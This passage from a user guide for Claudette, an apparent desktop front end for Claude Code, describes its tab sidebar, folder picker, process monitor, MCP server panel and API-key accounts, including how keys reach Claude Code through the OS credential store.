The tabs are listed in a sidebar on the left of the window, rather than a strip across the top, so long session names, a status line and many tabs all fit.

- **A tab's row** has two lines:
  - The status icon (with the tab's [mark](#4-tabs--sessions) under it, level with the second line, when it has one, or the reviewed icon over it while every changed file is reviewed), a pin icon if pinned, a sync icon if it syncs to the session library (muted, with the tip *"Synced to the session library · 312 MB"*, what the session takes there as of its last copy, [§9](#session-library-sync-across-machines), "Writing"), a phone icon while it's connected to the Claude app (*"Connected to the Claude app"*, dimmed while it connects or reconnects, and fainter still once it's switched off and waiting to disconnect; [§18](#remote-control-the-claude-app)), a gear while a process it started is busy ([Process monitor](#process-monitor)), a small count of its running tasks once its turn is over (its tip tells subagents apart: *"1 agent and 2 tasks still running"*, [§5](#running-tasks)), and the name, cut short with an ellipsis if it doesn't fit.
  - The model and effort, or instead what needs attention: *Needs your input*, the error, or *Possibly stuck* when check-ins get no reply ([§5](#check-ins-on-long-turns)). While a usage limit has stopped the tab's task and it will continue when the limit resets, *Usage limit · continues at 15:45* ([§6](#continuing-after-a-limit-resets)). While the tab works with one of Claude's tasks in progress, the task, in its active form (*Running the tests*, [§5](#tasks)).
  - **How far the tasks have got**, at the right of the second line, before where it works: *3/7* while Claude's tasks aren't all done, with the one in progress in its tip; clicking it selects the tab and opens the Tasks page ([§5](#tasks)). **Show task progress** (Settings → Conversation → **Tab rows**, on by default) turns it off, and the task on the second line with it.
  - **Where it works**, at the right of the second line, before the context ring, so the name keeps the first line's width. The text beside it is cut short first. Small bordered badges, no taller than the line:
    - **The git branch** the tab's folder has checked out, such as `main` or `feature/auth` (cut short past 120 pixels). A tab in a worktree shows the worktree's name with a branch icon ([Worktree tabs](#worktree-tabs)); a detached HEAD, its short commit. Its tip says which (*"On branch feature/auth"*, *"Works in the worktree brisk-otter, on branch worktree-brisk-otter"*, *"At a1b2c3d, not on a branch"*). Clicking it offers **Copy branch name**. It's read from the `.git` files, without running git: when the tab opens and is selected, after each turn, when its folder changes and when Claudette comes to the front, so a switch made by Claude or in a terminal shows. None outside a git repository. **Show the git branch** (Settings → Git → **Tab rows**, on by default) turns it off.
    - **The Perforce changelist**, `CL 12345`, with **Show changelist on tabs** on ([§18](#perforce-changelist-in-the-tab-title)).
  - **Context ring.** A small ring at the end of the row's second line, under the close button, fills up with the tab's context window ([§6](#per-tab-context)).
    - It's muted, amber when the context indicator warns (near auto-compact), and red from 95%.
    - Its tip is the composer bar's context text and detail, for example *"Context 75% (150,000 of 200,000 tokens · auto-compacts at 160,000)"*.
    - Clicking it shows what fills the context, as the composer bar's indicator does ([§6](#per-tab-context)), without selecting the tab.
    - It's hidden until the tab has context data, so a tab that hasn't started has none. **Show context** (Settings → Conversation → **Tab rows**, on by default) turns it off. The rail doesn't show it.
  - The close button shows on hover and on the selected tab, at the end of the first line, so it takes its room from the name alone: the second line holds still, ring or no ring. Hovering the row shows the tab info card; double-clicking renames it.
- **Threads.** A thread has a small thread icon before its name, its tip saying how many sub-threads it has, and its sub-threads sit indented under it, moving with it ([§18](#threads)).
- **Subagents.** Unless Settings → Conversation → **Show subagents' work** is **In the conversation**, each of the tab's subagents has a small row under the tab's, before its editor logs and project runs: the agents icon and its task over its type and what it's doing, nested ones further in, dimmed once finished and from an earlier turn. Selecting one shows its work in the tab, read-only; **×** dismisses a finished one ([§5](#subagents)).
- **Editor logs.** While one of the project's engine processes runs, such as the Unreal editor or a commandlet, the log it writes has a row under one of the project's tabs, before its project runs ([§18](#project-tools), "Editor logs"):
  - The log icon, in the accent while its process runs and muted once it has ended or moved to another file, or ✕ in the error color when its log says it crashed.
  - The file's name (`NightOwl.log`), and under it what writes it and the counts, *Unreal editor · 2 errors · 14 warnings*, or how it ended and when, *Closed · 15:02 · 2 errors*, *Crashed · 15:02* in the error color, or where its process moved its log, *Moved to Logs/Editor.log*, as Unity 6.5's editor does once it has the project open ([§18](#project-tools), "Editor logs", "A log that moves"). Hovering it shows its status line and the file's path.
  - Clicking it shows the log in the main area, in the focused pane, as a run's entry does. Its menu: **Open beside**, **Close pane**, **Copy log**, **Open file**, **Show in Explorer** (**Show in Finder**, **Show in file manager**) and **Close**. It can be dragged onto a pane.
  - × closes it at any time, and it comes back when its log starts again, as when the editor does.
- **Project runs.** Each time one of the tab's project actions runs as a job, such as a build, it gets a small entry under the tab's row, indented to the tab's name, newest last ([§18](#project-tools)):
  - A glyph for how it's going: the busy dot while it runs, ✓ when it succeeded, ✕ in the error color when it failed, and a muted ■ when it was stopped.
  - Its name, and under it how long it has been running (*Running · 1m 05s*), or how it ended and when (*Failed · exit code 6 · 14:32*, in the error color). Hovering it shows its status line, when it started and how long it took.
  - Clicking it shows its log in the main area, in the focused pane, as selecting a tab does ([§18](#project-tools), "A run's log"); the tab's own row goes back to the conversation. Starting a run doesn't take the main area. While its log has the focus, the entry is picked out as a selected tab's row is.
  - Its menu (right-click): **Open beside** and **Close pane**, as a tab's ([§18](#split-panes)), **Copy output**, **Stop** while it runs, and **Close** once it's done. Like a tab's row, it can be dragged onto a pane, but not within the sidebar.
  - An entry never closes on its own, whatever the result. A finished one has a close button (×) that takes the entry and its log away. While it runs, a **Stop** button (■) is in that place instead, and ends the job as **Stop** over its log does; so a click on × never stops a build.
  - Closing the tab takes its entries away. They aren't saved, so they're gone when Claudette quits or restarts.
- **Collapsing a tab.** ✅ Built 2026-10-20, from [issue #55](https://github.com/dotBunny/Claudette/issues/55). A tab with rows under it, its sub-threads ([§18](#threads)), its subagents' rows, its editor logs or its project runs, has a chevron on its group's line, level with its name. A click on it, or **Collapse tab** in its menu or the command palette, folds them all away under the tab's row, and a sub-thread's own rows go with it; **Expand tab** brings them back.
  - **The collapsed row** keeps its two lines and adds a small badge on the first: how many rows it hides, a sub-thread counting once with what's under it, then the most urgent status among them in its own color, `!` waiting on you, ✕ an error, a failed run, or an editor's log that crashed or has errors not yet looked at, the busy dot while one works, • one that finished unseen, as a collapsed group's label shows its tabs'. A subagent from an earlier turn that failed doesn't count: its row is dimmed already. Nor does an editor that's running: one open for hours isn't work going on. The badge's tip says what it hides, then names each one waiting on you or failed, a line each: *"Collapsed: 2 sub-threads, 1 log and 1 run"*, *"Gallery · Needs your input"*.
  - **It opens again by itself** when something under it is gone to: a sub-thread selected from its notification or **Go to tab** in the thread's strip; a run's or an editor's log shown, from its entry, **Show output…**, its notification or a click in its pane; a subagent's work shown from the Agents page or its card. Also when a sub-thread joins it (**New sub-thread**, **Assign to thread**), since the new tab is selected, and when something under it starts waiting on you: a sub-thread, or a subagent with a prompt. A run, an editor's log or a subagent starting doesn't open it, so a fan-out can stay folded, and one collapsed again while something waits stays collapsed until something else starts waiting.
  - Collapsing leaves the selection as it is: a sub-thread, a run's log or a subagent's work that's showing stays showing, as with a collapsed group. `Ctrl+Tab` and `Ctrl/Cmd+1…9` still count a collapsed thread's sub-threads, as they count a collapsed group's tabs, and leave it collapsed.
  - It's saved with the tab, through restarts and restarting into a new build (`rowsCollapsed`); a copy starts expanded. Once nothing is left under the row, the tab forgets it was collapsed, so the next row to come shows, with the chevron.
  - **Where the chevron is.** On the line in the group's color down the left of its tabs, centered on it, drawn in that color, with a gap in the line around it, level with the name; ∨ while expanded, › while collapsed. It takes no room in the row, so every name in a group starts in the same place whether or not its tab has rows under it, and only a sub-thread's indent says one tab is under another. A sub-thread's chevron is on the same line. Hovering it lights up its row, as hovering the row does. Moving or dragging a collapsed thread takes its sub-threads along, as ever, and rows folded away aren't anywhere to drop a tab.
  - **How it's built.** `TabViewModel.Rows.cs`: what's under the row, the fold (`TabState.RowsCollapsed`), the badge and when it opens by itself, with `RowUrgency` ranking the statuses for it and for a collapsed group's label. `ShellViewModel.SelectTab` opens a sub-thread's thread as it opens its group. The chevron is laid out at the start of the name's line, taking no room, and `Controls/OnLine` moves it across onto the group's line (`GroupLine`) after each layout pass, on whole screen pixels, so it's centered at any scale and however far in its row is; the row and the list of tabs don't clip, so it shows and can be clicked out there. `ThreadTests`, `SubagentTests` and `ProjectRunsTests` in the app, and `ThreadUiTests`.
- **A tab's menu** (right-click, in the full sidebar and the rail): **Rename**, **Reset name** while the tab has a name of its own, **Pin tab** or **Unpin tab**, **Mark** and **Clear mark** while it has one ([§4](#4-tabs--sessions), "Marks"), **Account ▸** once there are accounts besides Default ([§4](#accounts)), **Use usage credits** on the Default account ([§6](#tabs-that-dont-use-usage-credits)), **Sync to other machines** and **Sync now** while it syncs ([§9](#session-library-sync-across-machines)), **Connect to the Claude app** (disabled, with the reason as its tip, when the account can't use it) and **Open in the Claude app** while it's connected ([§18](#remote-control-the-claude-app)), **Tab settings…**, **Duplicate tab** ([§5](#rewind-and-branch)), **Open beside** and **Close pane** with tabs side by side ([§18](#split-panes)), the **Thread** submenu ([§18](#threads)), **Export conversation…** ([§5](#export)), **Copy session ID** once the tab has a session, **Trust this folder** while the tab runs without the folder's own Claude Code configuration ([§7](#folder-trust)), **Move up** and **Move down**, **Collapse tab** or **Expand tab** while the tab has rows under it ([Collapsing a tab](#sidebar)), **Close** and **Close other tabs**. The rail's menu is the same without **Reset name**, **Move up**, **Move down** and **Close other tabs**, and has **Collapse tab** only on a thread with sub-threads, which are all it lists under a tab. The project's actions and links aren't in it: they're in the menu of the project's icon on its group's row ([§18](#project-tools)).
- **Top:** **New tab**, which opens the picker ([Opening a tab](#opening-a-tab)), **History**, a clock ([§9](#history)), and the button that collapses the sidebar, over a line that sets them apart from the tabs. In the rail they're one under another: the button that expands it, **New tab**, **History**.
- **Foot:** under a line, and only while one of them shows: the Claude Code update badge when there is one ([§12](#applying-it)), the Claudette update badge when there's a new release ([§2](#updating-claudette)), **New build ready** when a source build of Claudette has a new build, and a source build's new commits ([§9](#working-on-claudette)). Later features of the kind add their own entries here. The foot once had the selected tab's project, **History**, **Settings** and **User Guide** too: the project is on its group's row ([§18](#project-tools)), **History** at the top, and Settings and the guide in the header ([§3](#3-main-window)).
- **Resizing.** Drag the sidebar's edge to make it wider or narrower: at least 180 pixels (248 by default), and with no most of its own, only that it leaves the conversation 360 and the tool windows their least: the strip's 40 pixels, and while a window shows at the right, the right side's 260 too. So dragging it wide can narrow the right side, down to 260, but never the conversation. When the window narrows, the right side gives way before the sidebar does ([Tool windows](#tool-windows)), and the sidebar's width comes back as the window widens. Double-click the edge for the default width. The width is remembered.
- **Collapsing.** The collapse button, or `Ctrl/Cmd+B`, shrinks the sidebar to a rail:
  - The rail shows each group's color, then a square per tab with the first letter of its name, a small status icon at its top right and the tab's mark (or the reviewed icon) at its bottom left. Hovering a square shows the tab info card. It doesn't list project runs, editor logs or subagents, nor the sub-threads of a collapsed thread ([Collapsing a tab](#sidebar)).
  - Right-clicking a group's color gives the group's menu, **Rename…** and **Change color…** included.
  - A collapsed group shows only its color and its most urgent status.
  - New tab, the project, History, the update badge and Settings stay as icons.
  - Whether the sidebar is collapsed is remembered.
- **Narrow windows.** Below 900 pixels wide the sidebar collapses to the rail by itself, and expands again when the window is widened. Expanding it by hand in a narrow window lasts until the window is widened, when the remembered choice applies again; neither changes that choice.
- **Claude Code's projects.** ✅ Built 2026-10-29. The sidebar can list the folders Claude Code has sessions in on this machine, from its own storage, so you work in your projects straight from the sidebar, as `claude` in a terminal does from their folders, instead of through the picker or History. Settings → Tabs → **Claude Code's projects** → **Show Claude Code's projects in the sidebar** (this computer's, since the folders differ from one machine to the next; off until chosen). With it on:
  - **Every folder with sessions is a group**, tab or no tab: the ones with nothing open come after the groups with tabs, the most recently used first, and each looks like any group, with its label, color, `+`, Project files button and menu, so **New tab here** and **History for this folder** are a click away. Its menu has no **Close group** while nothing is open in it: it leaves when the setting is turned off, or when its folder is gone. It isn't saved with the tabs' order (`GroupOrder`): it's placed by its sessions each time. A group with nothing open doesn't count as a tab: the window still says *Start a Claude Code session*, and the picker still opens at launch.
  - **Past sessions.** Every group ends with the folder's past sessions, under its tabs: a muted row, *12 past sessions*, with the chevron a group's label has, folded away by default. A group with nothing open has no tabs to fold them under, so it lists them straight away, without the row; once a tab opens in it, the rest fold away under the tab. Unfolding it lists the latest five, newest first, each with its name (its mark before it, as in History) and under it when it was last used and how many messages, *2 h ago · 14 messages*, and the machine when another used it last; and **Show all in History…** when there are more, which is **History for this folder**. A session open in a tab isn't listed, since its tab is above; closing the tab puts it back. Clicking one resumes it in a new tab in the group, as History does (`SessionOpener`), with the same questions when another machine has it. Whether a folder's are unfolded is remembered on this machine (`ExpandedPastSessions`).
  - **Reading them.** The sessions are the ones History lists ([§9](#history)), read the same way (`HistorySessions`): Claude Code's own on this machine merged with the library's records, off the UI thread, when Claudette starts, when the setting is turned on, and when Claudette comes to the front, for sessions a terminal started meanwhile. The index caches each transcript by size and date, so a read after the first is quick. One read runs at a time: one asked for while another runs (Claudette coming to the front again) runs once after it, so they don't pile up and none lands after a newer one. A folder that no longer exists here isn't listed, nor are conflict copies, which History has; each project's folder is checked once, in the read, off the UI thread, since a network drive that's gone can take seconds to say so. A worktree's sessions are its repository's, as in History.
  - **The offer.** The first time Claudette starts with the setting never chosen and Claude Code has sessions in folders that exist here, a card at the top of the sidebar says *Claude Code has sessions in 23 folders on this machine.* and asks whether to show them there as groups, with **Show them in the sidebar** and **Not now**. Either answers for good (`ClaudeProjectsOffered`): the first turns the setting on, the second leaves it off, and Settings → Tabs has the switch. Choosing in Settings first answers it too. The card isn't in the rail.
  - **How it's built.** `ShellViewModel.ClaudeProjects.cs`: the read, the layout of the groups from it (`ApplyClaudeProjects`, which runs again when a tab opens or closes, from the projects last read, without touching the disk), the offer and the rows' commands; `TabGroupViewModel.IsClaudeProject`, `PastSessions` and `IsPastSessionsExpanded` (with `ShowsPastSessionsFold` and `ShowsPastSessionList` for a group with nothing open), with `PastSessionRow` for a row; `HistorySessions`, which History reads with too, and its `ReadProjectsAsync`, the sessions by project with the gone folders left out. `ClaudeProjectsTests`.

### Opening a tab

`Ctrl/Cmd+T`, or **New tab** at the top of the sidebar, opens the **New tab** picker. A group's own `+` skips the picker and opens a tab in that group's folder.

The picker shows:

- A **search box** that filters the list by folder name or path as you type.
- **One list of folders**, with no headings: the **favorites**, folders starred by the user, always at the top, then the **recent folders**, most recently used first. Each entry shows:
  - The folder name and its path, shortened with `~`.
  - The current git branch, if it's a repo.
  - When it was last used, and how many tabs are open in it now.
- **Browse…**, which opens the native folder picker for any other folder.
- **Open from History…** (a button beside **Browse…**), which opens History ([§9](#history)) to resume a past session instead of starting a new one.

Using the picker:

- Arrow keys and `Enter` pick an entry, and `1`–`9` pick one of the first nine.
- Right-click an entry for **Add to favorites** / **Remove from favorites**, **Remove from recents**, **Reveal in file manager** and **Copy path**.
- A folder that no longer exists is shown dimmed, marked "not found", and can be removed.

**How the list is kept.**

- A folder is added (or moved to the top) whenever a tab opens in it.
- The list keeps the 20 most recent folders by default; the number can be changed in Settings. Favorites don't count toward the limit and are never dropped.
- Recent folders and favorites belong to this machine, because paths differ between machines. They aren't part of settings sync.

**Other ways in.**

- Dragging a folder from Finder or Explorer onto the sidebar opens a tab there.
- The command line: `Claudette --folder <path>` opens a tab in that folder on startup. Open Recent and the jump list use this too. A relative path is from where the command ran, also when a running Claudette takes it. `--login` is how the login entry starts Claudette: minimized, and ignored by a running Claudette ([§9](#starting-at-login)).
- On macOS, **File → Open Recent** and the Dock icon's menu list recent folders. On Windows, the taskbar jump list does the same, unless the user has turned off **Show recently opened items** in Windows' Start settings, which stops Windows from showing any app's recent items there.
- Choosing any of these opens a new tab in that folder.
- The lists hold favorites first, then recent folders, up to 10, leaving out folders that no longer exist. Folders with the same name show their parent too (`work/api`), as tab groups do.
- **One Claudette at a time.** A launch while Claudette is running (from the jump list, or by opening the app again) passes its arguments to the running one over a named pipe and exits. The running one comes to the front, and opens a tab if a folder was given. A development copy with its own `CLAUDETTE_HOME` counts as a separate instance.
  - The running one holds a lock on `instance.lock` in the data folder, so two launches at the same moment can't both start: the one that doesn't get the lock hands its arguments to the one that did, waiting up to 10 seconds for it to listen. If it never does, the launch starts anyway rather than do nothing. The lock ends with the process, so a crash never leaves it held.
  - Only the same user's Claudette is handed arguments, and only the same user's launches are read (`CurrentUserOnly` on both ends).
  - A restart into a new build or version (§9, §2) lets go of the lock as it stops listening; the new one waits for the lock and hands nothing on. If it doesn't start, the old one takes the lock back.
- The macOS menu bar also has **File → New Tab**, **History…** and **Close Tab**, and the app menu has **About Claudette**, which opens Settings → About ([About](#about)), and **Settings…**. Each shows its shortcut from Settings → Keyboard ([§14](#keyboard-shortcuts)). Its **Help** menu has **User Guide**, **Ask on Discord** and **Report an Issue**, as at the foot of Settings' sidebar ([Version](#version)).

### Process monitor

An optional view of the processes each tab has started, such as test runs, dev servers, builds and MCP servers, with their CPU and memory use. It's off by default and turned on in Settings → Tabs → **Process monitor**. One tab can turn it on or off for itself in its **Tab settings…** ([§14](#per-tab-overrides)). The Processes tool window shows the focused tab's processes ([Tool windows](#tool-windows)).

- **Summary.** When it's on, the composer bar shows a compact summary for the tab, for example `3 procs · 42% CPU · 1.1 GB`, except while the Processes tool window shows the tab's processes. The count leaves out `claude` itself. The tab itself gets a small activity icon while any child process is using noticeable CPU (5% or more).
- **Header total.** The usage header, before the service status dot, adds up every tab's latest sample, `claude` included: `63% CPU · 2.4 GB`. Its tooltip gives each tab's summary, and how many tabs aren't counted (not started yet, or with the monitor off). It comes from the tabs' own samples, so it takes no sampling of its own and follows their pace, and it's hidden while no tab has the monitor on. Claudette's own process isn't in it.
- **Processes panel.** A tool window, next to Changed files, Agents and Project. It shows a tree of the tab's processes, starting from its `claude` process, with these columns:
  - Name and PID.
  - CPU %, following the platform's convention: on Windows, 100% means all cores, as in Task Manager; on macOS, 100% means one core, as in Activity Monitor.
  - Memory (working set / resident size).
  - Running time, then the process's arguments, cut short.
  - **Command line.** The row ends its second line with the arguments, on one line in the room the running time leaves, ending in "…" where they run out of it: without the program, which the row names, and with each path down to its last part, as an option's value too, so `node C:\app\node_modules\vite\bin\vite.js --port 5173` shows `vite.js --port 5173`. The whole command line, which can run to many lines, is in the row's tooltip rather than on the row, so the tree stays compact. Hover the row for it, or use **Copy command line**. Can be hidden in Settings, because command lines sometimes contain tokens or passwords; then neither shows. How it's built: `ProcessArguments` (`Claudette.Platform`) cuts them short.
  - Each process keeps its row from sample to sample, updated in place, so the list doesn't flash every couple of seconds and a selected row stays selected.
  - A process whose parent isn't listed, such as a project job's or a detached one, sits at the top level beside `claude`.
  - **Collapsing.** A process with others under it has an arrow before its name, as in VS Code's file tree, that collapses them.
    - Collapsed, the row counts them after its PID (`+4`), and its CPU and memory include theirs, so collapsing never hides a busy process. Its tooltip says so.
    - Nothing more than two levels under `claude` shows at first: a process two levels down starts collapsed.
    - Alt+click (Option+click on macOS) on an arrow expands or collapses every level under it too, as **Expand all** and **Collapse all** in the row's menu do.
    - A process stays as it was left until it exits. Another program given its PID later starts as any process at its depth does.
- **Project jobs.** A project action's job, such as a build ([§18](#project-tools)), is tracked from its own process and listed with the tab's, as a top-level process beside `claude`. **Stop** on one of its processes stops it within the job's tree.
- **Link to the conversation.** When a process belongs to a Bash tool call or a background task, its row shows which one, on one line (hover for all of it), and clicking it scrolls to that card in the conversation. Claude Code's `task_started` events give the task ID and tool call ID, and Claudette matches them to the new process. A process that's gone is forgotten, so another program given its PID later isn't linked to the old call.
- **Actions**, in a row's right-click menu. A row lights up under the pointer, as a changed file's does, so it's plain it has one, and stays lit while its menu is open, so it's plain which process the menu is for.
  - **Stop.** For a Claude Code background task, stop it through Claude Code (`stopTask`) so Claude knows it ended. Otherwise, end the process, first gracefully and then forcefully. Either way, confirm first.
  - **Copy PID.**
  - **Copy command line.**
  - **Reveal executable.**
  - **Expand all** and **Collapse all**, on a process with others under it: every level under it.
- **Sampling.** Every 2 seconds while the panel is visible (Settings → Tabs → **Process monitor** → **Refresh every (seconds)**), and every 10 seconds when only the summary is showing. No sampling runs when the monitor is off.
- **How processes are tracked.** Tracking is always on, even with the monitor off, because tab cleanup relies on it; only sampling is off.
  - **Windows.**
    - Each tab's `claude` process goes into its own Job Object right after it starts, so every descendant is tracked, even if its parent exits. Nested jobs work, so this holds when Claudette itself runs inside a job (as it does when started from VS Code or a terminal).
    - The job doesn't kill on close, so "leave them running" stays possible. If the job can't be created, Claudette falls back to walking parent links.
    - CPU, memory and start times come from the process APIs, and command lines from `NtQueryInformationProcess` (no WMI).
    - Windows gives every console program a console host (`conhost.exe`) in the job; it's hidden from the list and the counts.
  - **macOS and Linux.** Claudette walks the process tree from the tab's `claude` process: `/proc` on Linux, and `ps` on macOS, which is simpler to get right than libproc. A process that detaches and gets re-parented (for example a daemonized dev server) drops out of the tree. Claudette keeps listing any process it has already seen, marked "detached", until it exits.
    - One scan of the system serves every tab: a tab in the background, which only shows its summary every 10 seconds, uses a scan another tab made in the last 5 seconds, with CPU use worked out from when that scan was made. The Processes page, stopping a process and ending a tree always scan afresh, and a signal sent makes the next sample scan again. With several tabs open that's one `ps` on macOS, or one read of `/proc`, rather than one per tab.
    - A process is known by its PID and its start time, so a PID reused after a process exits is never mistaken for it: the root's start time is read as the tab's `claude` starts, and nothing is signalled whose start time no longer matches. `ps` runs in UTC, so start times are never ambiguous when the clocks go back.
    - On Linux it's tested against real processes: children and their details, a process whose parent exited, **Stop** with `SIGTERM` and then `SIGKILL` for one that ignores it, CPU use, and ending a tree that keeps starting processes.
    - The macOS code compiles and its `ps` parsing is tested, but it hasn't run on a Mac yet.
- **Linking a process to its tool call.** A process that first appears while a Bash call is running is linked to that call. A `task_started` message ties a background task to its Bash call, so **Stop** goes through Claude Code (`stop_task`) for those.
- **Cleanup.** The same tracking lets Claudette end a tab's whole process tree when the tab closes, so no orphaned dev servers are left running.
  - If processes are still running, the close confirmation lists them. The choices are **Close and stop them** and **Close, leave running**.
  - Claudette lets `claude` exit on its own first, so it finishes its transcript, then ends whatever it left behind.
  - Quitting Claudette stops every tab's processes.

### MCP servers

The **MCP** tool window lists the session's MCP servers, for a tab whose session has any (`mcp_servers` on `system/init`).

- Each server shows its name, how it's connected (*Connected · 12 tools*, *Connecting…*, *Needs signing in*, *Failed*, *Off*), where it's configured and its version when Claude Code says, and the error for one that failed. Its row lights up under the pointer, as a process's does, so it's plain which server its buttons are for.
- **Reconnect**, on a server that isn't connected, asks Claude Code to connect it again (`mcp_reconnect`), for example after starting the program it talks to or signing in.
- **Turn off** and **Turn on** take a server out of the session, and its tools with it, or put it back (`mcp_toggle`). It's for this session only: the user's and project's MCP settings aren't changed.
- **Sign in**, on a server that needs signing in, asks Claude Code for the server's sign-in page (`mcp_authenticate`) and opens it in the browser. Claude Code waits on this machine for the browser to come back, then connects the server by itself; **Refresh** shows it. If the page the browser ends on doesn't load, its address can be pasted into the row, which finishes the sign-in (`mcp_oauth_callback_url`). A server already signed in is just read again. All three requests are undocumented, so one Claude Code refuses says so, with *"You can sign in with /mcp in Claude Code in a terminal."*
- **Sign out**, on a connected remote (HTTP or SSE) server, makes Claude Code forget its sign-in (`mcp_clear_auth`), so connecting it again asks again.
- Only web addresses are opened: a sign-in page that isn't `https` or `http` isn't.
- The list is read from Claude Code (`mcp_status`) when the page opens and after each change, and **Refresh** reads it again. A failed server puts a warning dot on the page's tab, with *"1 needs attention"* as its tip.
- The server's name and its error are the server's own text, shown as text.

### Accounts

Tabs can run Claude Code under accounts besides the one it's signed in to, for people with a personal plan and a work account, which at work is usually an API key ([issue #47](https://github.com/dotBunny/Claudette/issues/47)). API-key accounts are built; what's left is [below](#still-to-build).

- **The Default account** is Claude Code's own sign-in, as in a terminal ([§11](#11-sign-in)). Tabs run under it unless something picks another, and the header's plan usage is its plan's ([§6](#6-token-burn-awareness)).
- **API-key accounts.** Settings → Accounts adds one: a name and the key.
  - The key goes only to the OS credential store, as a Perforce password does ([§18](#perforce-ticket-handling)), under `claude-api-key/<account id>`: never in Claudette's files, a command line, the environment or a log, and never synced.
  - **How Claude Code gets it.** A tab on the account starts `claude` with `--settings '{"apiKeyHelper": "\"<Claudette>\" --api-key-helper <id>"}'`. Claude Code runs that command through a shell, and reads the key from what it prints. The command is Claudette itself: started with `--api-key-helper` and an account's id, it prints the key from the credential store and exits, before anything else (no window, no hand-off to the running Claudette). Claude Code keeps the key for five minutes and asks again after a 401, so a changed key is picked up without a restart. Claudette's path and the id go in the command as they are, so a path a shell would read differently (with a quote, `$`, `%` or a backtick in it) isn't used, and the tab says why.
  - Claude Code takes an `apiKeyHelper` over a claude.ai sign-in, but takes `ANTHROPIC_API_KEY` and `ANTHROPIC_AUTH_TOKEN` over the helper (under `-p`, without asking), so the account's tabs start without those two. The Default account's tabs keep them, as user configuration.
  - The account runs in the Default account's config folder, so its tabs share everything else with Default's: settings, MCP servers, plugins, skills, transcripts and History. Moving a tab between them copies nothing.
  - Each machine sets up its own accounts, kept in `state.json`; keys stay in each machine's store.
- **Which account a tab runs under.**
  - A folder group has one for its new tabs: **Account ▸** in its menu (in the full sidebar and the rail) lists Default and each account with its color, the group's ticked. It's remembered for the folder on this machine, however its path was written. Tabs already open keep theirs.
  - A folder opened for the first time uses Settings → Accounts → **New folders use** (Default unless changed).
  - The menus show once there's an account besides Default.
- **Tags.** Each account has a color: the first group color no other account has, changeable in Settings → Accounts. A group whose new tabs use an account other than Default has a small tag with the account's name in its color beside its label. A tab whose account isn't its group's has its account's tag on its row; Default's is muted. Once there are accounts, the tab info card has an **Account** row.
- **Moving a tab.** **Account ▸** in a tab's menu starts its Claude Code again under the chosen account, resuming the session.
  - The prompt cache is never shared between organizations, and the API drops thinking blocks made under another one, so the next turn reads the whole conversation again, once, without the cache. A tab with a conversation asks first, with what that costs: *"Claude reads the conversation's 150,000 tokens again under Work, without the prompt cache, once: about $0.75 at list price."* That's the context's size times the model's input price times 1.25, the rate of a five-minute cache write, from list prices of 2026-09-25; a model without a known price gets no amount. Moving to a plan says the read counts toward its limits instead. A tab with no conversation moves without asking.
  - While Claude works, the move waits for the turn to end, as a change of extra folders does.
- **What an API key changes.**
  - It has no plan limits. Its tabs' `rate_limit_event`s don't reach the header, whose plan is the Default account's.
  - While one of its tabs is selected, the header shows its spend instead of the plan: the account's name and color, and its estimated spend today, this week (from the first day of the week in the user's locale) and this month, from Claude Code's `costUSD` for each turn on this machine, and, while usage is shared, other machines' synced tabs' turns under an API-key account of the same name ([§6](#sharing-across-machines)). It's labeled an estimate, and a click opens the Usage panel. The plan's meters, sparkline, chevron and detailed header come back with a Default tab.
  - **Spend warnings.** Each account can warn when today's or this month's estimated spend passes an amount (Settings → Accounts, off until set): once a day and once a month, as an OS notification of the usage alerts kind ([§10](#10-notifications)), with no line under the header, remembered so a restart doesn't repeat it. The spend is the header's, so another machine's turns under the same name count, and each machine warns for itself.
  - A key Claude Code refuses, or can't get, is the tab's own error: *"Claude Code couldn't use Work's API key. Check the key in Settings → Accounts, or move the tab to another account."* The sign-in banner, holding messages and restarting after a sign-in ([§11](#11-sign-in)) are the Default account's.
  - It can't use Remote Control, which needs a claude.ai sign-in ([§18](#remote-control-the-claude-app)): its tabs' **Connect to the Claude app** is off, saying why.
- **Settings → Accounts.** **New folders use**. Each account, with its name, its color, **Warn when today's estimated spend passes ($)** and **Warn when this month's estimated spend passes ($)**, **Change key…**, and **Remove…**, which asks first in place and can't while an open tab runs under the account; the folders that used it use Default again. **Add an API key**, with a name and the key. Without a credential store (Linux without `secret-tool`), adding is off, saying why. **Reset to defaults** only sets **New folders use** back to Default: the accounts are the user's.
- **Usage history.** Each turn record has its account, null for Default, as every turn recorded before accounts is. Once there's an account besides Default, the Usage panel lists **Accounts** under **Projects**, over the same period: tokens, estimated cost and turns each ([§6](#usage-history)).
- **Still to build.**
  - **Second claude.ai sign-ins**, such as a company Team plan beside a personal one. Each gets a config folder of its own (a new one in Claudette's data folder, or one already used, such as `~/.claude-work`) with its own sign-in and sign-out. It shares Default's settings, CLAUDE.md, skills, agents, commands, output styles and plugins through links. Its MCP servers are in `.claude.json` with its sign-in, so they're copied when the account is made, with **Copy from Default again**. Plan usage is tracked per account, History and the other reads cover every folder, and moving a tab copies its transcript, subagents and checkpoints, as **Choose folder…** does. First, a spike: whether a linked `settings.json` stays linked when Claude Code saves it (file links on Windows also need Developer Mode). If not, folders are linked as junctions, CLAUDE.md is pulled in with an `@` import, and `settings.json` is copied whenever Default's changes.
  - **A strip of accounts** beside the weekly meters when there are several: a plan's session percentage, or a key's spend today. Only accounts with open tabs are polled; the others show their last reading, marked with its age.
  - **When a plan limit stops a tab,** offering to continue it under another account with room, or an API key, with what the re-read costs, beside **Continue when it resets**.
  - **Not planned:** Bedrock, Vertex and Foundry accounts; syncing accounts between machines (only their turns' spend is matched, by name); real spend from the Admin API, which needs an organization admin's key.

## 5. Conversation View

The conversation is drawn from Claude Code's structured output stream, not from terminal text.

| Item | How it's shown |
|---|---|
| User message | A **You** card, or one naming what sent it (*"Automatic check-in"*, *"From the thread Plan"*); attached images as thumbnails. Its time on the card's header line, with **Copy message**, **Add to scratch pad** and **⋯** before it on hover ([below](#copy-and-times)). |
| Assistant text | Markdown with syntax-highlighted code blocks, each with **Copy**. Streams in as it's generated. Its time on the card's header line, with **Copy message**, **Add to scratch pad** and, once it's whole, **Show as the plan** before it on hover. A click on a web link opens it in the browser, as it does in a plan and an agent's prompt and report. Only `https`, `http` and `mailto` links go to the browser, as the project's links ([§18](#project-tools)), so a reply can't start a program through an app's own scheme. A link to a file, or inline code that names one (`weapons.md`, `src/Player.cpp:42`), opens the file in the OS's app for it, and never runs a program ([§18](#files-named-in-claudes-replies)). An image in it loads at once only from the tab's folder; a web image waits for a click ([§18](#images-in-claudes-replies)). |
